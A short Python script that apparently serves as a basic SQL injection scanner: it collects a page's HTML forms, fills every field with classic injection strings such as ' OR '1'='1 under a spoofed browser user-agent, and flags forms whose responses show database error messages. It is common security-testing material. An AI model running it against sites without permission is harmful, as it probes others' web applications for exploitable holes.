import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all(["input", "textarea"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def test_for_sql_injection(url, form_details):
    sql_injection_payloads = ["'", '"', " OR 1=1", " OR 'a'='a", "--", "#", "/*", "' OR '1'='1"]
    scan_results = []

    for payload in sql_injection_payloads:
        data = {}
        for input_tag in form_details["inputs"]:
            data[input_tag["name"]] = payload

        if form_details["method"] == "post":
            response = s.post(urljoin(url, form_details["action"]), data=data)
        else:
            response = s.get(urljoin(url, form_details["action"]), params=data)

        if any(error in response.text.lower() for error in ["quoted string not properly terminated", "unclosed quotation mark", "you have an error in your sql syntax"]):
            return True

    return False

def sql_injection_scan(url):
    forms = get_forms(url)
    scan_results = []

    for form in forms:
        details = form_details(form)
        form_result = {
            "action": details["action"],
            "method": details["method"],
            "inputs": []
        }

        for input_tag in details["inputs"]:
            form_result["inputs"].append({
                "name": input_tag["name"],
                "value": input_tag["value"]
            })

        is_vulnerable = test_for_sql_injection(url, details)
        form_result["vulnerable"] = is_vulnerable

        scan_results.append(form_result)

    return scan_results
